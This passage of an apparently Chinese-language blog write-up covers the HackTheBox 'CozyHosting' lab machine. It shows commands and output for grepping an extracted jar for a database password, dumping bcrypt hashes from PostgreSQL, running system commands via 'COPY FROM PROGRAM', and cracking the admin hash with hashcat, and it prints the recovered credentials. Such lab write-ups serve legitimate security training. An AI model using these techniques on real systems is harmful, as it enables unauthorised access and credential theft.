+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693718459723-1a8d5e3c-769e-4d82-965b-eb442a051e4c.png#averageHue=%23161616&clientId=u29a2d45b-6550-4&from=paste&height=827&id=ued7bd16c&originHeight=930&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=158827&status=done&style=none&taskId=u4ff4e910-9b4b-488a-a586-6930951aeb3&title=&width=1706.6666666666667" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<h2 id="下载-jar包"><a href="#下载-jar包" class="headerlink" title="下载 jar包"></a>下载 jar包</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693718847466-1293929d-e2f8-411b-b5cb-7fcca04418c8.png#averageHue=%23161616&clientId=u29a2d45b-6550-4&from=paste&height=822&id=u66e5a2ef&originHeight=925&originWidth=1915&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=195720&status=done&style=none&taskId=u3d6c3037-039a-4704-8380-8beed15f9ad&title=&width=1702.2222222222222" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>利用nc 把这个 jar包传出来看看</p>
+<pre><code class="bash"> 2028  cp clouhosting-0.0.1.jar clouhosting-0.0.1.zip
+ 2029  unzip clouhosting-0.0.1.
+ 2030  unzip clouhosting-0.0.1.zip
+ 2032  mkdir cloud
+ 2033  mv BOOT-INF org META-INF cloud
+ 2035  cd cloud
+ 2036  ls
+ 2037  grep &quot;pass&quot; ./ -r
+ 2038  grep &quot;password&quot; ./ -r
+ 2039  grep &quot;username&quot; ./ -r
+</code></pre>
+<p>把拿到的jar包转为zip，搜索jar里面的铭感信息</p>
+<pre><code class="bash">┌──(root💀kali)-[/home/…/hacktheboxtools/machine/CozyHosting/cloud]
+└─# grep &quot;password&quot; ./ -r
+grep: ./BOOT-INF/lib/spring-security-crypto-6.0.1.jar: binary file matches
+./BOOT-INF/classes/application.properties:spring.datasource.password=Vg&amp;nvzAQ7XxR
+grep: ./BOOT-INF/classes/htb/cloudhosting/secutiry/SecurityConfig.class: binary file matches
+grep: ./BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches
+grep: ./BOOT-INF/classes/htb/cloudhosting/database/CozyUser.class: binary file matches
+./BOOT-INF/classes/templates/login.html:                                        &lt;input type=&quot;password&quot; name=&quot;password&quot; class=&quot;form-control&quot; id=&quot;yourPassword&quot;
+./BOOT-INF/classes/templates/login.html:                                        &lt;div class=&quot;invalid-feedback&quot;&gt;Please enter your password!&lt;/div&gt;
+./BOOT-INF/classes/templates/login.html:                                    &lt;p th:if=&quot;${param.error}&quot; class=&quot;text-center small&quot;&gt;Invalid username or password&lt;/p&gt;
+./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:&lt;/symbol&gt;&lt;symbol viewBox=&quot;0 0 24 24&quot; id=&quot;ri-lock-password-fill&quot;&gt;
+./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.symbol.svg:&lt;/symbol&gt;&lt;symbol viewBox=&quot;0 0 24 24&quot; id=&quot;ri-lock-password-line&quot;&gt;
+./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-fill:before { content: &quot;\eecf&quot;; }
+./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.css:.ri-lock-password-line:before { content: &quot;\eed0&quot;; }
+./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-fill:before { content: &quot;\eecf&quot;; }
+./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.less:.ri-lock-password-line:before { content: &quot;\eed0&quot;; }
+grep: ./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.eot: binary file matches
+./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    &lt;glyph glyph-name=&quot;lock-password-fill&quot;
+./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.svg:    &lt;glyph glyph-name=&quot;lock-password-line&quot;
+grep: ./BOOT-INF/classes/static/assets/vendor/remixicon/remixicon.ttf: binary file matches
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/CozyHosting/cloud]
+└─# grep &quot;username&quot; ./ -r
+./BOOT-INF/classes/application.properties:spring.datasource.username=postgres
+grep: ./BOOT-INF/classes/htb/cloudhosting/scheduled/FakeUser.class: binary file matches
+grep: ./BOOT-INF/classes/htb/cloudhosting/compliance/ComplianceService.class: binary file matches
+grep: ./BOOT-INF/classes/htb/cloudhosting/database/CozyUserDetailsService.class: binary file matches
+./BOOT-INF/classes/templates/admin.html:                                        &lt;input name=&quot;username&quot; class=&quot;form-control&quot; id=&quot;username&quot; placeholder=&quot;user&quot;&gt;
+./BOOT-INF/classes/templates/admin.html:                                        &lt;label for=&quot;username&quot;&gt;Username&lt;/label&gt;
+./BOOT-INF/classes/templates/login.html:                                            &lt;input type=&quot;text&quot; name=&quot;username&quot; class=&quot;form-control&quot; id=&quot;yourUsername&quot;
+./BOOT-INF/classes/templates/login.html:                                            &lt;div class=&quot;invalid-feedback&quot;&gt;Please enter your username.&lt;/div&gt;
+./BOOT-INF/classes/templates/login.html:                                    &lt;p th:if=&quot;${param.error}&quot; class=&quot;text-center small&quot;&gt;Invalid username or password&lt;/p&gt;
+
+┌──(root💀kali)-[/home/…/hacktheboxtools/machine/CozyHosting/cloud]
+└─# cat ./BOOT-INF/classes/application.properties
+server.address=127.0.0.1
+server.servlet.session.timeout=5m
+management.endpoints.web.exposure.include=health,beans,env,sessions,mappings
+management.endpoint.sessions.enabled = true
+spring.datasource.driver-class-name=org.postgresql.Driver
+spring.jpa.database-platform=org.hibernate.dialect.PostgreSQLDialect
+spring.jpa.hibernate.ddl-auto=none
+spring.jpa.database=POSTGRESQL
+spring.datasource.platform=postgres
+spring.datasource.url=jdbc:postgresql://localhost:5432/cozyhosting
+spring.datasource.username=postgres
+spring.datasource.password=Vg&amp;nvzAQ7XxR                                                                                                                                                     
+</code></pre>
+<h3 id="postgres-数据库"><a href="#postgres-数据库" class="headerlink" title="postgres 数据库"></a>postgres 数据库</h3><table>
+<thead>
+<tr>
+<th>spring.datasource.username</th>
+<th>spring.datasource.password</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>postgres</td>
+<td>Vg&amp;nvzAQ7XxR</td>
+</tr>
+</tbody></table>
+<pre><code class="bash">app@cozyhosting:/app$ netstat -ntlp
+netstat -ntlp
+(Not all processes could be identified, non-owned process info
+ will not be shown, you would have to be root to see it all.)
+Active Internet connections (only servers)
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -            
+tcp        0      0 127.0.0.1:5432          0.0.0.0:*               LISTEN      -            
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -            
+tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -            
+tcp6       0      0 :::22                   :::*                    LISTEN      -            
+tcp6       0      0 127.0.0.1:8080          :::*                    LISTEN      1061/java    
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693719498706-a084ea58-0184-48ba-9493-131efd61fbfc.png#averageHue=%23151515&clientId=u29a2d45b-6550-4&from=paste&height=650&id=u9d80f825&originHeight=731&originWidth=1898&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=187235&status=done&style=none&taskId=u447160e2-34de-49c5-b1e2-02463490fe7&title=&width=1687.111111111111" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>frp 搭建代理进去看看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693719561668-cc499538-a74f-45d1-9c7d-77f71824c47a.png#averageHue=%23fcfcfc&clientId=u29a2d45b-6550-4&from=paste&height=523&id=udd6c062b&originHeight=588&originWidth=1374&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=29252&status=done&style=none&taskId=u85061d9d-8ffa-4408-bc93-760205109cb&title=&width=1221.3333333333333" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>内网127.0.0.1:8000端口，其实就是起了一个web ,- -好吧 (后面感觉是其他用户起的web服务)</p>
+<p>那我们现在有了postgre数据库的密码，我们可以连上去看看</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693719973848-d7c1fa85-1fc3-4832-ad72-50b438beb51d.png#averageHue=%23f3f2f2&clientId=u29a2d45b-6550-4&from=paste&height=653&id=uc7898225&originHeight=735&originWidth=1354&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=54561&status=done&style=none&taskId=ucfbc8b18-cad1-4fef-a35e-b692b22d298&title=&width=1203.5555555555557" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>navicat不知道为什么连不上- -，代理明明是好的  (后来发现是navicat版本太低)<br>那就去shell里面用命令行吧 </p>
+<h3 id="命令行连接"><a href="#命令行连接" class="headerlink" title="命令行连接"></a>命令行连接</h3><pre><code class="bash">app@cozyhosting:/tmp$ psql -h localhost -p 5432 -U postgres -d cozyhosting
+psql -h localhost -p 5432 -U postgres -d cozyhosting
+Password for user postgres: Vg&amp;nvzAQ7XxR
+
+psql (14.9 (Ubuntu 14.9-0ubuntu0.22.04.1))
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+Type &quot;help&quot; for help.
+
+cozyhosting=#
+</code></pre>
+<pre><code class="bash">
+cozyhosting=# help
+help
+You are using psql, the command-line interface to PostgreSQL.
+Type:  \copyright for distribution terms
+       \h for help with SQL commands
+       \? for help with psql commands
+       \g or terminate with semicolon to execute query
+       \q to quit
+cozyhosting=# \l
+\l
+WARNING: terminal is not fully functional
+Press RETURN to continue
+
+                                   List of databases
+    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
+eges
+-------------+----------+----------+-------------+-------------+----------------
+-------
+ cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
+ postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
+ template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres
+      +
+             |          |          |             |             | postgres=CTc/po
+stgres
+ template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres
+      +
+             |          |          |             |             | postgres=CTc/po
+stgres
+(4 rows)
+
+(END)
+(END)
+(END)q
+cozyhosting=#
+cozyhosting=# \l
+\l
+WARNING: terminal is not fully functional
+Press RETURN to continue
+
+                                   List of databases
+    Name     |  Owner   | Encoding |   Collate   |    Ctype    |   Access privil
+eges
+-------------+----------+----------+-------------+-------------+----------------
+-------
+ cozyhosting | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
+ postgres    | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 |
+ template0   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres
+      +
+             |          |          |             |             | postgres=CTc/po
+stgres
+ template1   | postgres | UTF8     | en_US.UTF-8 | en_US.UTF-8 | =c/postgres
+      +
+             |          |          |             |             | postgres=CTc/po
+stgres
+(4 rows)
+
+(END)
+(END)q
+cozyhosting=#
+cozyhosting=# \c cozyhosting
+\c cozyhosting
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+You are now connected to database &quot;cozyhosting&quot; as user &quot;postgres&quot;.
+cozyhosting=# \conninfo
+\conninfo
+You are connected to database &quot;cozyhosting&quot; as user &quot;postgres&quot; on host &quot;localhost&quot; (address &quot;127.0.0.1&quot;) at port &quot;5432&quot;.
+SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
+cozyhosting=# \dt
+\dt
+WARNING: terminal is not fully functional
+Press RETURN to continue
+
+         List of relations
+ Schema | Name  | Type  |  Owner
+--------+-------+-------+----------
+ public | hosts | table | postgres
+ public | users | table | postgres
+(2 rows)
+
+(END)
+(END)q
+cozyhosting=#
+cozyhosting=# select * from users;
+select * from users;
+WARNING: terminal is not fully functional
+Press RETURN to continue
+
+   name    |                           password                           | role
+
+-----------+--------------------------------------------------------------+-----
+--
+ kanderson | $2a$10$E/Vcd9ecflmPudWeLSEIv.cvK6QjxjWlWXpij1NVNV3Mm6eH58zim | User
+ admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+(2 rows)
+
+(END)
+(END)q
+cozyhosting=#
+cozyhosting=# select * from hosts;
+select * from hosts;
+WARNING: terminal is not fully functional
+Press RETURN to continue
+
+ id | username  |      hostname
+----+-----------+--------------------
+  1 | kanderson | suspicious mcnulty
+  5 | kanderson | boring mahavira
+  6 | kanderson | stoic varahamihira
+  7 | kanderson | awesome lalande
+(4 rows)
+
+(END)q
+</code></pre>
+<h3 id="postgres-执行命令"><a href="#postgres-执行命令" class="headerlink" title="postgres 执行命令"></a>postgres 执行命令</h3><p>postgre是可以执行系统命令<br>Refer:<a href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce" target="_blank" rel="noopener">https://book.hacktricks.xyz/network-services-pentesting/pentesting-postgresql#rce</a></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693722705716-73b44569-2878-427a-a613-8ff00b94b6f6.png#averageHue=%231f2429&clientId=u29a2d45b-6550-4&from=paste&height=639&id=ud247aa8a&originHeight=719&originWidth=1105&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=60850&status=done&style=none&taskId=u413124cb-1e21-47d3-b711-319e94474be&title=&width=982.2222222222222" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<pre><code class="bash">DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM &#39;id&#39;;
+SELECT * FROM cmd_exec;
+DROP TABLE IF EXISTS cmd_exec;
+</code></pre>
+<pre><code class="bash">cozyhosting=# copy (SELECT &#39;&#39;) to program &#39;id&#39;
+copy (SELECT &#39;&#39;) to program &#39;id&#39;
+cozyhosting-# DROP TABLE IF EXISTS cmd_exec;
+CREATE TABLE cmd_exec(cmd_output text);
+COPY cmd_exec FROM PROGRAM &#39;id&#39;;
+SELECT * FROM cmd_exec;
+DROP TABLE IF EXISTS cmd_exec;DROP TABLE IF EXISTS cmd_exec;
+ERROR:  syntax error at or near &quot;DROP&quot;
+LINE 2: DROP TABLE IF EXISTS cmd_exec;
+        ^
+cozyhosting=# CREATE TABLE cmd_exec(cmd_output text);
+CREATE TABLE
+cozyhosting=# COPY cmd_exec FROM PROGRAM &#39;id&#39;;
+COPY 1
+cozyhosting=# SELECT * FROM cmd_exec;
+WARNING: terminal is not fully functional
+Press RETURN to continue
+
+                               cmd_output
+------------------------------------------------------------------------
+ uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)
+(1 row)
+
+...skipping...
+                               cmd_output
+------------------------------------------------------------------------
+ uid=114(postgres) gid=120(postgres) groups=120(postgres),119(ssl-cert)
+(1 row)
+
+~
+IF: No such file or directory  (press RETURN)q
+cmd_exec: No such file or directory  (press RETURN)
+</code></pre>
+<p>再反弹一个postgre 权限的shell </p>
+<h2 id="postgre-ReverseShell"><a href="#postgre-ReverseShell" class="headerlink" title="postgre ReverseShell"></a>postgre ReverseShell</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693722895808-de770b7b-5f47-4a9f-809a-5d281eea2ea7.png#averageHue=%23181818&clientId=u29a2d45b-6550-4&from=paste&height=358&id=u1a7e1f77&originHeight=403&originWidth=1850&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=89573&status=done&style=none&taskId=u8e5ad797-867b-4234-a5e0-870e1d5d04d&title=&width=1644.4444444444443" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>看了一圈  好像也没什么用，</p>
+<h2 id="frp-代理"><a href="#frp-代理" class="headerlink" title="frp 代理"></a>frp 代理</h2><figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693725410807-442741cf-8a81-4a34-acb4-3c9ed06264c1.png#averageHue=%23121212&clientId=u29a2d45b-6550-4&from=paste&height=437&id=u025f2114&originHeight=492&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=71850&status=done&style=none&taskId=uc9c9a8a6-4f2b-4f3b-b96e-b81c5ded055&title=&width=1706.6666666666667" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>内网还有一个 8080 的服务</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693725591966-fa84539d-8613-4d99-9404-0be41997e4d9.png#averageHue=%23a2ce86&clientId=u29a2d45b-6550-4&from=paste&height=844&id=uf74e3a5c&originHeight=949&originWidth=1920&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=101430&status=done&style=none&taskId=u41d7202a-c8e7-470b-9a99-e56110f8435&title=&width=1706.6666666666667" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+<p>好家伙，应该只是nginx转发，外网80转到内网这个8080，其实就是一个服务</p>
+<h2 id="峰回路转-爆破hash"><a href="#峰回路转-爆破hash" class="headerlink" title="峰回路转-爆破hash"></a>峰回路转-爆破hash</h2><p>看了一圈，感觉也就只有 数据库里面的admin密码不知道，需要爆破 ,<br>kanderson 的密码 jar 包里面已经读取到了 ,使用 idea 反编译代码可以知道</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693736881632-ac1fb2aa-e32e-46eb-aa53-a61a2b2197fd.png#averageHue=%232b2b2b&clientId=u497f6918-60f2-4&from=paste&id=u439f9172&originHeight=332&originWidth=712&originalType=url&ratio=1.125&rotation=0&showTitle=false&size=9230&status=done&style=none&taskId=u39fe464b-d708-4cfd-b2ab-8da0e2927e6&title=" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<pre><code class="bash"> admin     | $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm | Admin
+</code></pre>
+<p>这个hash，我不知道什么类型，使用 john 跑了一会知道了是 <code>**bcrypt [Blowfish 32/64 X3]**</code></p>
+<pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/CozyHosting]
+└─# john hash2 /usr/share/SecLists/Passwords/Leaked-Databases/rockyou-75.txt    130 ⨯ 1 ⚙
+Warning: only loading hashes of type &quot;bcrypt&quot;, but also saw type &quot;tripcode&quot;
+Use the &quot;--format=tripcode&quot; option to force loading hashes of that type instead
+Warning: only loading hashes of type &quot;bcrypt&quot;, but also saw type &quot;descrypt&quot;
+Use the &quot;--format=descrypt&quot; option to force loading hashes of that type instead
+Warning: only loading hashes of type &quot;bcrypt&quot;, but also saw type &quot;pix-md5&quot;
+Use the &quot;--format=pix-md5&quot; option to force loading hashes of that type instead
+Using default input encoding: UTF-8
+Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
+Cost 1 (iteration count) is 1024 for all loaded hashes
+Will run 8 OpenMP threads
+Proceeding with single, rules:Single
+Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
+Almost done: Processing the remaining buffered candidate passwords, if any.
+Proceeding with wordlist:/usr/share/john/password.lst
+0g 0:00:00:04 0.43% 2/3 (ETA: 05:44:07) 0g/s 169.8p/s 169.8c/s 169.8C/s yellow..butter
+0g 0:00:00:06 0.61% 2/3 (ETA: 05:45:04) 0g/s 173.0p/s 173.0c/s 173.0C/s stinky..88888888
+0g 0:00:00:08 0.78% 2/3 (ETA: 05:45:35) 0g/s 173.4p/s 173.4c/s 173.4C/s grumpy..jimbob
+0g 0:00:00:12 1.15% 2/3 (ETA: 05:45:59) 0g/s 174.0p/s 174.0c/s 174.0C/s 333333..iverson
+0g 0:00:00:17 1.56% 2/3 (ETA: 05:46:43) 0g/s 174.1p/s 174.1c/s 174.1C/s jump..otter
+Proceeding with incremental:ASCII
+0g 0:00:18:55  3/3 0g/s 162.4p/s 162.4c/s 162.4C/s bonnn..boshu
+0g 0:00:21:50  3/3 0g/s 160.2p/s 160.2c/s 160.2C/s 140912..143622
+0g 0:00:21:51  3/3 0g/s 160.2p/s 160.2c/s 160.2C/s 142293..150311
+0g 0:00:21:52  3/3 0g/s 160.2p/s 160.2c/s 160.2C/s 151721..153365
+Session aborted
+</code></pre>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2023/png/33561677/1693735174880-66f72c44-bdd8-40c7-9e44-bd78e9b702bb.png#averageHue=%23f7f9fa&clientId=u29a2d45b-6550-4&from=paste&height=36&id=uf6e5be7a&originHeight=40&originWidth=773&originalType=binary&ratio=1.125&rotation=0&showTitle=false&size=2856&status=done&style=none&taskId=ub77087a3-99e5-4f87-8119-2024b50e150&title=&width=687.1111111111111" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p> 跑了一个多小时，还是没跑出来，换成hashcat</p>
+<pre><code class="bash">┌──(root💀kali)-[/home/kali/hacktheboxtools/machine/CozyHosting]
+└─# hashcat -m 3200 -a 0 hash2 /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+
+OpenCL API (OpenCL 2.0 pocl 1.8  Linux, None+Asserts, RELOC, LLVM 9.0.1, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
+====================================================================================================================================
+* Device #1: pthread-Intel(R) Core(TM) i5-10300H CPU @ 2.50GHz, 2918/5900 MB (1024 MB allocatable), 8MCU
+
+Minimum password length supported by kernel: 0
+Maximum password length supported by kernel: 72
+
+Hashes: 1 digests; 1 unique digests, 1 unique salts
+Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
+Rules: 1
+
+Optimizers applied:
+* Zero-Byte
+* Single-Hash
+* Single-Salt
+
+Watchdog: Temperature abort trigger set to 90c
+
+Initializing backend runtime for device #1. Please be patient...
+
+
+Host memory required for this attack: 0 MB
+
+
+
+
+Dictionary cache hit:
+* Filename..: /usr/share/wordlists/rockyou.txt
+* Passwords.: 14344385
+* Bytes.....: 139921507
+* Keyspace..: 14344385
+
+Cracking performance lower than expected?
+
+* Append -w 3 to the commandline.
+  This can cause your screen to lag.
+
+* Append -S to the commandline.
+  This has a drastic speed impact but can be better for specific attacks.
+  Typical scenarios are a small wordlist but a large ruleset.
+
+* Update your backend API runtime / driver the right way:
+  https://hashcat.net/faq/wrongdriver
+
+* Create more work items to make use of your parallelization power:
+  https://hashcat.net/faq/morework
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt; s
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
+Time.Started.....: Sun Sep  3 05:51:43 2023 (20 secs)
+Time.Estimated...: Tue Sep  5 07:38:20 2023 (2 days, 1 hour)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       80 H/s (6.77ms) @ Accel:8 Loops:8 Thr:1 Vec:1
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 1472/14344385 (0.01%)
+Rejected.........: 0/1472 (0.00%)
+Restore.Point....: 1472/14344385 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:640-648
+Candidate.Engine.: Device Generator
+Candidates.#1....: maurice -&gt; mexico1
+Hardware.Mon.#1..: Util: 64%
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt;
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
+Time.Started.....: Sun Sep  3 05:51:43 2023 (20 secs)
+Time.Estimated...: Tue Sep  5 07:38:20 2023 (2 days, 1 hour)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       80 H/s (6.67ms) @ Accel:8 Loops:8 Thr:1 Vec:1
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 1472/14344385 (0.01%)
+Rejected.........: 0/1472 (0.00%)
+Restore.Point....: 1472/14344385 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:688-696
+Candidate.Engine.: Device Generator
+Candidates.#1....: maurice -&gt; mexico1
+Hardware.Mon.#1..: Util: 73%
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt;
+
+s^?^?
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
+Time.Started.....: Sun Sep  3 05:51:43 2023 (35 secs)
+Time.Estimated...: Tue Sep  5 21:17:40 2023 (2 days, 15 hours)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       63 H/s (7.89ms) @ Accel:8 Loops:8 Thr:1 Vec:1
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 1536/14344385 (0.01%)
+Rejected.........: 0/1536 (0.00%)
+Restore.Point....: 1536/14344385 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: clover -&gt; dragon1
+Hardware.Mon.#1..: Util:  2%
+
+[s]tatus [p]ause [b]ypass [c]heckpoint [f]inish [q]uit =&gt;
+
+Session..........: hashcat
+Status...........: Running
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
+Time.Started.....: Sun Sep  3 05:51:43 2023 (35 secs)
+Time.Estimated...: Tue Sep  5 21:17:40 2023 (2 days, 15 hours)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       63 H/s (7.89ms) @ Accel:8 Loops:8 Thr:1 Vec:1
+Recovered........: 0/1 (0.00%) Digests (total), 0/1 (0.00%) Digests (new)
+Progress.........: 1536/14344385 (0.01%)
+Rejected.........: 0/1536 (0.00%)
+Restore.Point....: 1536/14344385 (0.01%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: clover -&gt; dragon1
+Hardware.Mon.#1..: Util:  7%
+
+$2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib3H9kVO8dm:manchesterunited
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
+Hash.Target......: $2a$10$SpKYdHLB0FOaT7n3x72wtuS0yR8uqqbNNpIPjUb2MZib...kVO8dm
+Time.Started.....: Sun Sep  3 05:51:43 2023 (48 secs)
+Time.Estimated...: Sun Sep  3 05:52:31 2023 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
+Guess.Queue......: 1/1 (100.00%)
+Speed.#1.........:       60 H/s (5.03ms) @ Accel:8 Loops:8 Thr:1 Vec:1
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 2816/14344385 (0.02%)
+Rejected.........: 0/2816 (0.00%)
+Restore.Point....: 2752/14344385 (0.02%)
+Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: bebito -&gt; medicina
+Hardware.Mon.#1..: Util: 71%
+
+Started: Sun Sep  3 05:50:20 2023
+Stopped: Sun Sep  3 05:52:32 2023
+</code></pre>
+<p>没到3分钟，跑出来了- -<br><strong>manchesterunited</strong><br>**ssh 连接 **</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
